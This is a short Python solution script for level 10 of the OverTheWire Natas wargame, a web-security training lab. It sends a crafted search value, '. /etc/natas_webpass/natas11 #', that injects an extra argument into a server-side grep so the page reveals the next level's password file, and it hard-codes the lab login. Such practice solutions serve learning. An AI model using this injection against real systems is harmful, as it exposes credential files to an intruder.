import requests
import re
username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = 'http://%s.natas.labs.overthewire.org/' % username
sess = requests.Session()
res = sess.post(url, data={"needle": ". /etc/natas_webpass/natas11 #", "submit": "submit"}, auth=(username, password))
content = res.text
print(re.findall("<pre>\n(.*)",content)[0])
